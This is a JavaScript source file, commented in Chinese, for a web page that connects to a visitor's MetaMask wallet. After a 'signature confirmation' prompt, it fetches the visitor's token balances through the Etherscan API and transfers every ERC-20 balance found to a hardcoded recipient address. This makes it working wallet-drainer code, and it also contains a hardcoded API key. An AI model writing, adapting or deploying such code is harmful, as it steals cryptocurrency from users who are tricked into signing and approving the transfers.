const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';
let web3;
let isConnected = false;

const erc20Abi = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "success", "type": "bool"}],
        "type": "function"
    }
];

// 更新已连接钱包列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    walletList.innerHTML = ''; // 清空之前的地址
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 更新状态信息
const updateStatus = (message) => {
    const statusElement = document.getElementById('status');
    statusElement.innerText += `\n${message}`;
};

// 连接钱包按钮点击事件
document.getElementById('connectButton').onclick = async () => {
    try {
        if (window.ethereum) {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();

            if (accounts.length > 0) {
                updateWalletList(accounts[0]);
                isConnected = true;
                updateStatus('MetaMask 已连接');
                document.getElementById('signButton').disabled = false; // 启用签名按钮
            } else {
                updateStatus('未检测到已连接的账户');
            }
        } else {
            updateStatus('请安装 MetaMask 钱包');
        }
    } catch (error) {
        updateStatus('连接失败: ' + error.message);
    }
};

// 签名按钮点击事件
document.getElementById('signButton').onclick = async () => {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length > 0) {
        const account = accounts[0];
        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
        try {
            const signature = await web3.eth.personal.sign(message, account);
            updateStatus(`签名成功: ${signature}`);

            // 调用转移资产的函数
            await transferAssets(account);
        } catch (error) {
            updateStatus(`签名失败: ${error.message}`);
        }
    } else {
        updateStatus('请先连接钱包');
    }
};

// 转移资产的函数
const transferAssets = async (account) => {
    updateStatus(`正在获取 ${account} 的代币余额...`);
    const tokenBalances = await getTokenBalances(account);

    for (const tokenAddress in tokenBalances) {
        const token = tokenBalances[tokenAddress];
        const balance = token.balance;

        if (balance.gt(0)) {
            const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
            try {
                const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: account });
                updateStatus(`成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`);
            } catch (error) {
                updateStatus(`转移 ${token.symbol} 失败: ${error.message}`);
            }
        } else {
            updateStatus(`账户 ${account} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`);
        }
    }

    updateStatus('所有代币转移完成');
};

// 获取代币余额的函数
const getTokenBalances = async (address) => {
    try {
        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63`;
        const response = await axios.get(url);
        const transactions = response.data.result;

        const tokenBalances = {};

        for (const tx of transactions) {
            const tokenAddress = tx.contractAddress;
            const tokenSymbol = tx.tokenSymbol;

            if (!tx.from || !tx.to) {
                continue; // 跳过没有 from 或 to 的交易
            }

            if (!tokenBalances[tokenAddress]) {
                tokenBalances[tokenAddress] = {
                    symbol: tokenSymbol,
                    balance: web3.utils.toBN(0)
                };
            }

            if (tx.from.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
            }

            if (tx.to.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
            }
        }

        return tokenBalances;
    } catch (error) {
        updateStatus('获取代币余额失败: ' + error.message);
        return {};
    }
};
